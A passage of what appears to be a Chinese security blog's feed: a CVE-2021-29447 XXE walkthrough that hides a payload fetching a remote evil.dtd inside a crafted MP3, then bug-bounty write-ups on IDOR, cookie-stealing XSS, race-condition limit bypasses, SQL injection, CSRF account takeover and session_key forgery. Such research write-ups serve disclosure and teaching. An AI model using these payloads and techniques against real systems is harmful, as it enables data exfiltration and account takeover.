class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">GetFileFormatArray</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$format_name</span> =&gt; <span class="hljs-variable">$info</span>) &#123;<br><span class="hljs-comment">// The /s switch on preg_match() forces preg_match() NOT to treat</span><br><span class="hljs-comment">// newline (0x0A) characters as special chars but do a binary match</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;pattern&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;#&#x27;</span>.<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;pattern&#x27;</span>].<span class="hljs-string">&#x27;#s&#x27;</span>, <span class="hljs-variable">$filedata</span>)) &#123;<br><span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;include&#x27;</span>] = <span class="hljs-string">&#x27;module.&#x27;</span>.<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;group&#x27;</span>].<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;module&#x27;</span>].<span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$info</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而riff数组如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27;riff&#x27;</span> =&gt; <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;pattern&#x27;</span>   =&gt; <span class="hljs-string">&#x27;^(RIFF|SDSS|FORM)&#x27;</span>,<br><span class="hljs-string">&#x27;group&#x27;</span>     =&gt; <span class="hljs-string">&#x27;audio-video&#x27;</span>,<br><span class="hljs-string">&#x27;module&#x27;</span>    =&gt; <span class="hljs-string">&#x27;riff&#x27;</span>,<br><span class="hljs-string">&#x27;mime_type&#x27;</span> =&gt; <span class="hljs-string">&#x27;audio/wav&#x27;</span>,<br><span class="hljs-string">&#x27;fail_ape&#x27;</span>  =&gt; <span class="hljs-string">&#x27;WARNING&#x27;</span>,<br>),<br></code></pre></td></tr></table></figure><p>就是要保证$filedata为RIFF，$filedata来源为：</p><p><img src="/2023/04/27/file-upload/240522162528391.png" alt="image-20240522162528391"></p><p>这里有fseek和fread，问了一下gpt：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">fseek</span><span class="hljs-params">(<span class="hljs-variable">$this</span>-&gt;fp, <span class="hljs-variable">$this</span>-&gt;info[<span class="hljs-string">&#x27;avdataoffset&#x27;</span>])</span></span>: 这一行代码是在文件指针（<span class="hljs-variable">$this</span>-&gt;fp）上进行偏移操作。fseek 函数用于在文件中定位指针的位置。第一个参数是文件指针，第二个参数是要移动的偏移量。在这里，<span class="hljs-variable">$this</span>-&gt;info<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;avdataoffset&#x27;</span>]</span> 是一个数组中的键，用于指定文件中的偏移量。这表示代码将从文件的指定位置开始读取数据。<br><br><span class="hljs-function"><span class="hljs-title">fread</span><span class="hljs-params">(<span class="hljs-variable">$this</span>-&gt;fp, <span class="hljs-number">32774</span>)</span></span>: 这一行代码是使用 fread 函数从文件中读取数据。第一个参数是文件指针，第二个参数是要读取的最大字节数。在这里，它试图读取 <span class="hljs-number">32774</span> 字节的数据。<br><br>至于 avdataoffset 是什么意思，通常它是指音视频文件中音视频数据（AV data）的偏移量。这个偏移量指示了文件中的数据从哪里开始。但是，它不是一个固定值，它的值会根据文件的类型和格式而变化。在读取特定类型的音视频文件时，需要根据文件格式解析文件头部信息，从中提取出这个偏移量的值，然后才能正确地定位到音视频数据的起始位置。<br></code></pre></td></tr></table></figure><p>也就是说，首先将指针移动到info[‘avdataoffset’]处，并且从该处开始，匹配pattern，下面修改mp3文件，使得在经过偏移之后，被解析成riff。重跑一遍看偏移量：</p><p><img src="/2023/04/27/file-upload/240522215644958.png" alt="image-20240522215644958"></p><p>121450.在winhex中填充0字符，在121450(1DA6A)偏移之后，填充RIFF：</p><p><img src="/2023/04/27/file-upload/240522222102683.png" alt="image-20240522222102683"></p><p><img src="/2023/04/27/file-upload/240522222028575.png" alt="image-20240522222028575"></p><p>成功，接下来由640行步入到Analyze。</p><p>回到开头的分析，这里需要关注<code>$thisfile_riff_WAVE = &amp;$thisfile_riff[&#39;WAVE&#39;];</code>，再到<code>$parsedXML = getid3_lib::XML2array($thisfile_riff_WAVE[&#39;iXML&#39;][0][&#39;data&#39;])</code>。</p><p>因此，需要找到$thisfile_riff[‘WAVE’]在何处被赋值，往前看最终定位到：</p><p><img src="/2023/04/27/file-upload/240522222624807.png" alt="image-20240522222624807"></p><p>需要满足两个条件：</p><ul><li>$RIFFsubtype&#x3D;’WAVE’</li><li>$this-&gt;ParseRIFF($offset, ($offset + $thisfile_riff[‘header_size’] - 4))能被解析成<code>$thisfile_riff_WAVE[&#39;iXML&#39;][0][&#39;data&#39;]</code></li></ul><p>代码如下：</p><p><img src="/2023/04/27/file-upload/240522223249288.png" alt="image-20240522223249288"></p><p>取12个字节，前四个字节为type(RIFF)，接下来为size，最后四个为subtype(需要为WAVE)。</p><p>继续改mp3文件：</p><p><img src="/2023/04/27/file-upload/240522223719683.png" alt="image-20240522223719683"></p><p><img src="/2023/04/27/file-upload/240522223651981.png" alt="image-20240522223651981"></p><p>subtype解决，但是右边的值为false。</p><p>最后一步就是跟进ParseRIFF，修改mp3文件使得能被成功解析为<code>$thisfile_riff_WAVE[&#39;iXML&#39;][0][&#39;data&#39;]</code>即可。</p><p>跟进ParseRIFF:</p><p><img src="/2023/04/27/file-upload/240522233619114.png" alt="image-20240522233619114"></p><p>$chunkname为12个字节偏移后的四个字节，需要解析为iXML，并且在代码中也能看到该分支：</p><p><img src="/2023/04/27/file-upload/240522233822454.png" alt="image-20240522233822454"></p><p>修改mp3文件：</p><p><img src="/2023/04/27/file-upload/240522234511026.png" alt="image-20240522234511026"></p><p>chunkname为iXML，iXML后4个字节表示chunksize，随便输入1111（十进制）：</p><p><img src="/2023/04/27/file-upload/240522234359175.png" alt="image-20240522234359175"></p><p>在下面的if判断中报警，chunksize过大：</p><p><img src="/2023/04/27/file-upload/240522234419697.png" alt="image-20240522234419697"></p><p>修改mp3:</p><p><img src="/2023/04/27/file-upload/240522234936011.png" alt="image-20240522234936011"></p><p>此时能够进入if语句：</p><p><img src="/2023/04/27/file-upload/240522234920063.png" alt="image-20240522234920063"></p><p>读取chunksize个长度的数据，赋值给<code>$RIFFchunk[$chunkname][$thisindex][&#39;data&#39;]</code>，也就是<code>$RIFFchunk[&#39;iXML&#39;][0][&#39;data&#39;]</code>,也即<code>$thisfile_riff_WAVE[&#39;iXML&#39;][0][&#39;data&#39;]</code>.</p><p>下面直接插入xxe的payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;http://192.168.122.1:9999/evil.dtd&#x27;</span>&gt;</span>%remote;%init;%trick;]&gt;</span><br></code></pre></td></tr></table></figure><p>长度为120，注意，chunksize的4个字节十进制需要大于120.改为150：</p><p><img src="/2023/04/27/file-upload/240522235852874.png" alt="image-20240522235852874"></p><p>再次上传，成功将xml数据带入到simplexml_load_string()，evil.dtd目录开启监听，上传mp3文件：</p><p><img src="/2023/04/27/file-upload/240522235836708.png" alt="image-20240522235836708"></p><p>成功带出数据。</p><p><strong>tips:在此，仅利用mp3文件，逐步分析poc的构成，如果直接用.wav文件会更简单(avdataoffset&#x3D;0).</strong></p>]]></content>
    
    
    <categories>
      
      <category>vulnerability</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
      <tag>CVE-2021-29447</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SRC漏洞挖掘--SRC挖掘日常1</title>
    <link href="/2024/07/23/SRC%E6%8C%96%E6%8E%98%E6%97%A5%E5%B8%B81/"/>
    <url>/2024/07/23/SRC%E6%8C%96%E6%8E%98%E6%97%A5%E5%B8%B81/</url>
    
    <content type="html"><![CDATA[<h1 id="SRC挖掘日常1"><a href="#SRC挖掘日常1" class="headerlink" title="SRC挖掘日常1"></a>SRC挖掘日常1</h1><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>在新增插件模块，可以对插件进行授权更改：</p><p><img src="/2023/04/27/file-upload/0240320155259873.png" alt="image-20240320155259873"></p><p>如图，可以选择将其授权给全部用户，并且授权范围也能更改。</p><p>抓包：</p><p><img src="/2023/04/27/file-upload/0240320155336532.png" alt="image-20240320155336532"></p><p>修改全部用户授权范围，发现其对应的就是permissionType参数，将dataId修改，即可更改对应插件的权限，使所有人都能对其进行编辑。</p><p>如图所示，已经获得了对他人插件的编辑权限。遍历id即可获取所有插件的权限。</p><p><img src="/2023/04/27/file-upload/0240320155516850.png" alt="image-20240320155516850"></p><h2 id="存储xss"><a href="#存储xss" class="headerlink" title="存储xss"></a>存储xss</h2><p>同样的站点，还可以上传知识库：</p><p><img src="/2023/04/27/file-upload/0240320155707613.png" alt="image-20240320155707613"></p><p>在文件名处插入xsspayload，失败，有过滤。</p><p>上传pdf-xss文件，同样失败，打开后为空白。</p><p>该处同样可以上传word文件，将payload写入word，上传：</p><p><code>&lt;iframe src=javascript:alert(document.cookie)&gt;&lt;/iframe&gt;</code></p><p>打开1234.docx:</p><p><img src="/2023/04/27/file-upload/0240320155912186.png" alt="image-20240320155912186"></p><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><p>这里是一个网盘的功能点，企业版网盘试用，最多可以添加5名用户：</p><p><img src="/2023/04/27/file-upload/0240320153213427.png" alt="image-20240320153213427"></p><p>此时如果再添加，会提示子账户已满：</p><p><img src="/2023/04/27/file-upload/0240320153316206.png" alt="image-20240320153316206"></p><p>如果直接并发，会提示：</p><p><img src="/2023/04/27/file-upload/0240320153427949.png" alt="image-20240320153427949"></p><p>因此在添加用户时，发送报文到repeater，并修改邮箱参数，如下发送了8次：</p><p><img src="/2023/04/27/file-upload/0240320153915021.png" alt="image-20240320153915021"></p><p>创建一个group，选择send group in parallel:</p><p><img src="/2023/04/27/file-upload/0240320153946659.png" alt="image-20240320153946659"></p><p>并发8个数据包，成功突破限制，添加了6名用户：</p><p><img src="/2023/04/27/file-upload/0240320154358865.png" alt="image-20240320154358865"></p><h3 id="邮件内容可控"><a href="#邮件内容可控" class="headerlink" title="邮件内容可控"></a>邮件内容可控</h3><p>同样是前面的网盘站点，空间内的文件有分享的功能，选择邮件分享，输入收件人邮箱，抓包：</p><p><img src="/2023/04/27/file-upload/0240320154836849.png" alt="image-20240320154836849"></p><p>body的参数如图，收到的内容为：</p><p><img src="/2023/04/27/file-upload/0240320155009943.png" alt="image-20240320155009943"></p><p>修改参数后发现，邮件内容可控，可以插入超链或者钓鱼信息等等。</p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SRC挖掘日常2</title>
    <link href="/2024/07/23/SRC%E6%8C%96%E6%8E%98%E6%97%A5%E5%B8%B82/"/>
    <url>/2024/07/23/SRC%E6%8C%96%E6%8E%98%E6%97%A5%E5%B8%B82/</url>
    
    <content type="html"><![CDATA[<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>该漏洞是通过 ARL 灯塔发现的，配置好策略和任务之后会在邮箱进行更新推送。<br><img src="/2023/04/27/file-upload/0240403085702397.png"><br>获取到新域名之后，到文件泄露模块查看，发现&#x2F;metrics，&#x2F;debug&#x2F;vars，&#x2F;health 等页面：<br><img src="/2023/04/27/file-upload/0240403085902864.png"><br><img src="/2023/04/27/file-upload/0240403085929578.png"><br>springboot 信息泄露的具体利用方式可以参考 <a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a><br>扫描工具可以参考 <a href="https://github.com/pyroxenites/SpringScan">https://github.com/pyroxenites/SpringScan</a></p><h2 id="url-重定向"><a href="#url-重定向" class="headerlink" title="url 重定向"></a>url 重定向</h2><p>开放重定向（Open Redirect），也叫URL跳转漏洞，是指服务端未对传入的跳转url变量进行检查和控制，导致诱导用户跳转到恶意网站，由于是从可信的站点跳转出去的，用户会比较信任。<br>下面是一个登录界面：<br><img src="/2023/04/27/file-upload/0240403090209491.png"><br>url 为 <a href="https://xxxxxx/account/register/?appId=ex55ohg9qfe6feu&display=none&forceLogin=true&loginType=registered&redirectUrl=https://xxxxxxx/web/op&render=developer&scope=wechat">https://xxxxxx/account/register/?appId=ex55ohg9qfe6feu&amp;display=none&amp;forceLogin=true&amp;loginType=registered&amp;redirectUrl=https%3A%2F%2Fxxxxxxx%2Fweb%2Fop&amp;render=developer&amp;scope=wechat</a><br>注意到这里有一个 redirectUrl 参数，将 url 改为 <a href="http://www.baidu.com/">www.baidu.com</a> ：<br><img src="/2023/04/27/file-upload/0240403090756362.png"><br>成功跳转。<br>这类情况还可以尝试 xss 漏洞，此处不存在。</p><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>这里是一个后台管理系统，可以注册用户进行登录。<br>登录后，查看行业客户信息：<br><img src="/2023/04/27/file-upload/0240403092805401.png"><br>这里在后台肯定会到数据库中进行查找，再到前端把数据展示出来。<br>问题在于，直接将 sql 语句，通过数据包写了出来：<br><img src="/2023/04/27/file-upload/0240403093440642.png"><br>更改 sql 语句：<br><img src="/2023/04/27/file-upload/0240403093715704.png"><br>可以直接执行 sql 命令，喜提严重。</p><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p>最后的逻辑漏洞也比较简单，设置了应用数上限为 10，通过 web 页面手动添加最多添加到 10 个。<br>添加时抓包：<br><img src="/2023/04/27/file-upload/0240403094257945.png"><br>这里直接 repeat 或者并发即可突破数量上限。<br><img src="/2023/04/27/file-upload/0240403094331638.png"></p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SRC挖掘日常4</title>
    <link href="/2024/07/23/SRC%E6%8C%96%E6%8E%98%E6%97%A5%E5%B8%B84/"/>
    <url>/2024/07/23/SRC%E6%8C%96%E6%8E%98%E6%97%A5%E5%B8%B84/</url>
    
    <content type="html"><![CDATA[<h1 id="SRC挖掘日常4"><a href="#SRC挖掘日常4" class="headerlink" title="SRC挖掘日常4"></a>SRC挖掘日常4</h1><p>某网站后台存在组织设置功能，如下：</p><p><img src="/2023/04/27/file-upload/0240619090300171.png" alt="image-20240619090300171"></p><p>可以设置组织logo。</p><p>上传一张图片，抓包：</p><p><img src="/2023/04/27/file-upload/0240619090459611.png" alt="image-20240619090459611"></p><p>这里的logo图片地址完全可控，想到结合csrf进行利用。</p><p>到个人中心处，发现能够绑定微信：</p><p><img src="/2023/04/27/file-upload/0240619092615373.png" alt="image-20240619092615373"></p><p>扫描，拦包，在手机点击确认后会抓到如下报文：</p><p><img src="/2023/04/27/file-upload/0240619091249727.png" alt="image-20240619091249727"></p><p>关键点在于此处的code值，只要任意用户访问带上code的&#x2F;auth&#x2F;weixin&#x2F;….就会将我的微信绑定到他的账号。</p><p>把这里的get请求做一个csrf的poc，替换为logo的url地址，此时只要加载logo，就会将自己的账号绑定上攻击者微信，攻击者通过微信扫码登录即可接管账户。</p><p>现在只需要让受害者加载logo即可，可以利用邀请成员的功能点，不需要对方同意，输入手机号或者邮箱即可成功邀请。邀请之后登录后台之后就能选择组织，并且自动加载logo，如下：</p><p><img src="/2023/04/27/file-upload/0240619092329223.png" alt="image-20240619092329223"></p><p>下面进行完整的操作，首先微信绑定扫码，抓取code，并且drop掉报文，替换logo，邀请受害者加入组织。</p><p>在受害者登录后台之后加载logo：</p><p><img src="/2023/04/27/file-upload/0240619092427083.png" alt="image-20240619092427083"></p><p>刷新页面：</p><p><img src="/2023/04/27/file-upload/0240619092546997.png" alt="image-20240619092546997"></p><p>微信扫码，成功接管受害者账户：</p><p><img src="/2023/04/27/file-upload/0240619092655865.png" alt="image-20240619092655865"></p><p>同样可以将logo替换成其他功能点，例如退出等等，会导致受害者无法选择企业，在登录后台之后就自动跳转至登录界面，造成拒绝服务。</p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SRC漏洞挖掘--sessionkey利用</title>
    <link href="/2024/07/23/SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--sessionkey%E5%88%A9%E7%94%A8/"/>
    <url>/2024/07/23/SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--sessionkey%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="SRC漏洞挖掘–sessionkey利用"><a href="#SRC漏洞挖掘–sessionkey利用" class="headerlink" title="SRC漏洞挖掘–sessionkey利用"></a>SRC漏洞挖掘–sessionkey利用</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>微信小程序官方提供了一套微信快捷登录的登录逻辑，用户授权手机号快捷登录时，会将本地的手机号使用sessionkey和iv进行aes加密，后端解密后返回该手机号的登录凭证。当sessionkey发生泄露时，攻击者便可以伪造手机号进行任意用户登录。</p><p>微信开发者文档中描述如下：</p><p><img src="/2023/04/27/file-upload/0231215100441796.png" alt="image-20231215100441796"></p><p>签名校验以及数据加解密涉及用户的会话密钥 session_key。 开发者应该事先通过 wx.login 登录流程获取会话密钥 session_key 并保存在服务器。为了数据不被篡改，开发者不应该把 session_key 传到小程序客户端等服务器外的环境。</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>通过微信搜索找到某平台小程序：</p><p><img src="/2023/04/27/file-upload/0231215100904395.png" alt="image-20231215100904395"></p><p>打开小程序，需要进行登录：</p><img src="SRC1/image-20231215100947262.png" alt="image-20231215100947262" style="zoom:50%;" /><p>点击忘记密码，接着允许微信授权：</p><p><img src="/2023/04/27/file-upload/0231215102640844.png" alt="image-20231215102640844"></p><p>这里在请求包中，泄露了session_key，同时还有iv和encryptData。</p><p>利用burp插件进行解密（插件地址：<a href="https://github.com/mrknow001/BurpAppletPentester">mrknow001&#x2F;BurpAppletPentester: SessionKey解密插件 (github.com)</a>）</p><p><img src="/2023/04/27/file-upload/0231215102706935.png" alt="image-20231215102706935"></p><p>分别填入sessionkey和iv，将encryptData填入密文中，加密后会得到类似于下面的信息：</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;<span class="hljs-string">&quot;phonenumber&quot;</span>:<span class="hljs-number">13888888888</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;timestamp&quot;</span><span class="hljs-symbol">:xxxxxxx</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;appid&quot;</span><span class="hljs-symbol">:xxxxxxx</span>&#125;<br></code></pre></td></tr></table></figure><p>将这里的phonenumber改为任意其他用户，点击加密，再将密文替换到请求包中，放包：</p><p><img src="/2023/04/27/file-upload/0231215102934961.png" alt="image-20231215102934961"></p><p>返回报文如图。</p><p>原先使用的手机号为139xxxxxxx，将其修改为181xxxxxxx，发现成功修改了181用户的密码：</p><img src="SRC1/image-20231215103114547.png" alt="image-20231215103114547" style="zoom:50%;" /><p>成功登录181用户的账号。</p><p>同理，只需要知道目标的手机号，即可进行密码修改，达到任意用户登录。</p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SRC漏洞挖掘--并发</title>
    <link href="/2024/07/23/SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E5%B9%B6%E5%8F%91/"/>
    <url>/2024/07/23/SRC%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98--%E5%B9%B6%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h1 id="SRC漏洞挖掘–并发"><a href="#SRC漏洞挖掘–并发" class="headerlink" title="SRC漏洞挖掘–并发"></a>SRC漏洞挖掘–并发</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>并发漏洞是一类涉及多线程、多用户或多进程环境下的安全漏洞，其独特性质在于攻击者能够利用系统同时处理多个请求的特点，以获取未授权访问、篡改数据或实施拒绝服务攻击。相较于传统漏洞，它们的复杂性在于在同一时间内处理多个请求可能导致数据不一致性和竞争条件。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><h3 id="数据不一致性"><a href="#数据不一致性" class="headerlink" title="数据不一致性"></a>数据不一致性</h3><p>并发漏洞可能导致系统中的数据不一致性。当多个请求同时修改共享数据时，如果没有合适的同步机制，数据可能会处于不一致的状态。这可能导致应用程序基于不正确或过时的数据做出决策，从而引发严重的业务逻辑问题。</p><h3 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h3><p>恶意攻击者可以通过利用并发漏洞引发拒绝服务攻击。通过大量的并发请求，攻击者可能使系统资源耗尽，导致正常用户无法访问服务。这种情况下，系统可能变得不稳定，甚至崩溃，影响整体可用性。</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>如果并发操作没有适当的隔离和控制，攻击者可能通过竞争条件或并发请求的执行路径，获取未授权的敏感信息。这可能包括用户数据、系统配置信息或其他敏感数据。</p><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><h3 id="优惠券"><a href="#优惠券" class="headerlink" title="优惠券"></a>优惠券</h3><p>在领取优惠券时，截取领取的报文，并发，可能领取到多张优惠券。</p><h3 id="提现"><a href="#提现" class="headerlink" title="提现"></a>提现</h3><p>在账户中留1.00余额，提现时并发，可能提现出更多金额。</p><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>在签到领取积分处，通过并发领取多次积分。</p><h3 id="抽奖"><a href="#抽奖" class="headerlink" title="抽奖"></a>抽奖</h3><p>只有一次抽奖机会，并发，可能会抽奖多次。</p><h3 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h3><p>通过高权限账户找到高权限才能访问的接口，切换到低权限账户，访问接口，一般会访问失败，通过并发进行多次访问，可能会访问成功。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>点赞，添加地址，存在限制的地方就有可能存在并发漏洞。</p><h2 id="防护方法"><a href="#防护方法" class="headerlink" title="防护方法"></a>防护方法</h2><h3 id="原子操作和事务"><a href="#原子操作和事务" class="headerlink" title="原子操作和事务"></a>原子操作和事务</h3><p>通过原子操作和事务确保操作的原子性，从而避免竞争条件的可能性，保障数据一致性。</p><h3 id="同步机制"><a href="#同步机制" class="headerlink" title="同步机制"></a>同步机制</h3><p>在编码中采用合适的同步机制和锁定机制，以确保多线程或多用户操作时的数据安全，防范并发漏洞的潜在威胁。</p><h3 id="安全编程实践"><a href="#安全编程实践" class="headerlink" title="安全编程实践"></a>安全编程实践</h3><p>实施安全编程实践，包括有效的输入验证、权限控制和错误处理，以减缓并发漏洞的攻击表面。</p><h3 id="使用并发控制工具和框架"><a href="#使用并发控制工具和框架" class="headerlink" title="使用并发控制工具和框架"></a>使用并发控制工具和框架</h3><p>部署先进的并发控制工具和框架，如分布式锁服务、事务管理系统等，提高系统的整体安全性。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>首先访问主页，看到有部分文章：</p><p><img src="/2023/04/27/file-upload/0231201232514060.png" alt="image-20231201232514060"></p><p>点击之后，发现有点赞的功能点，抓包查看如下：</p><p><img src="/2023/04/27/file-upload/0231201232828860.png" alt="image-20231201232828860"></p><p>首先尝试repeater模块，发现只会改变返回包中thumbed的值。1代表点赞成功，2代表取消点赞成功。</p><p>尝试并发插件，并发之后是一样的结果。</p><p>观察请求包中到此处有contentType参数，起始为1，尝试改变参数，发包，发现点赞数量增加。</p><p>使用intruder模块进行测试，设置3s左右的延时（间隔时间过短会请求失败），对contenttype进行爆破，即可无限制刷赞：</p><p><img src="/2023/04/27/file-upload/0231201233354328.png" alt="image-20231201233354328"></p><p>置顶文章点赞变成70，成功。</p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SRC挖掘日常3</title>
    <link href="/2024/07/23/SRC%E6%8C%96%E6%8E%98%E6%97%A5%E5%B8%B83/"/>
    <url>/2024/07/23/SRC%E6%8C%96%E6%8E%98%E6%97%A5%E5%B8%B83/</url>
    
    <content type="html"><![CDATA[<h1 id="SRC挖掘日常3"><a href="#SRC挖掘日常3" class="headerlink" title="SRC挖掘日常3"></a>SRC挖掘日常3</h1><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>首先是一个越权。</p><p>网站是一个后台管理，有工单处理的功能点。</p><p><img src="/2023/04/27/file-upload/0240416162140423.png" alt="image-20240416162140423"></p><p>可以处理工单，转派工单，关单，暂停等等。</p><p>以转派为例：</p><p><img src="/2023/04/27/file-upload/0240416162519193.png" alt="image-20240416162519193"></p><p>post参数有orderNo，servideMode等参数，这里的orderNo就是当前操作的工单号。</p><p>用小号同样创建一个工单，拿到工单号，目前的状态是已解决：</p><p><img src="/2023/04/27/file-upload/0240416162815717.png" alt="image-20240416162815717"></p><p>替换id，关单：</p><p><img src="/2023/04/27/file-upload/0240416163004377.png" alt="image-20240416163004377"></p><p>成功关闭：</p><p><img src="/2023/04/27/file-upload/0240416163022241.png" alt="image-20240416163022241"></p><p>此外，评论，转移工单等等都存在该问题，只需要工单号，即可进行接管。</p><p>下面就是获取工单号。</p><p>目前的两个账号工单号为website-pro-0401-2AB0001，website-pro-0401-41E0002，猜测为website-pro-日期-XXX000X，其中XXX为随机值，后面的X为创建的第X个工单。</p><p>爆破即可：<br><img src="/2023/04/27/file-upload/0240416163405156.png" alt="image-20240416163405156"></p><p><img src="/2023/04/27/file-upload/0240416163924448.png" alt="image-20240416163924448"></p><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p>同样的站点，能够管理资产配置：</p><p><img src="/2023/04/27/file-upload/0240416164335245.png" alt="image-20240416164335245"></p><p>当可访问组织直接全选，会提示最多可选500个，添加失败。</p><p>先添加300个，查看数据包：</p><p><img src="/2023/04/27/file-upload/0240416164619194.png" alt="image-20240416164619194"></p><p>再选中其他300个组织，手动在数据包中添加上，发包：</p><p><img src="/2023/04/27/file-upload/0240416164810151.png" alt="image-20240416164810151"></p><p>成功添加，突破限制。</p><h2 id="邮件轰炸"><a href="#邮件轰炸" class="headerlink" title="邮件轰炸"></a>邮件轰炸</h2><p>安全设置中绑定邮箱，数据包如下：</p><p><img src="/2023/04/27/file-upload/0240416164132268.png" alt="image-20240416164132268"></p><p>抓包并发即可。</p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>半自动化实现公众号文章推送</title>
    <link href="/2024/07/23/%E5%8D%8A%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%9E%E7%8E%B0%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E6%8E%A8%E9%80%81/"/>
    <url>/2024/07/23/%E5%8D%8A%E8%87%AA%E5%8A%A8%E5%8C%96%E5%AE%9E%E7%8E%B0%E5%85%AC%E4%BC%97%E5%8F%B7%E6%96%87%E7%AB%A0%E6%8E%A8%E9%80%81/</url>
    
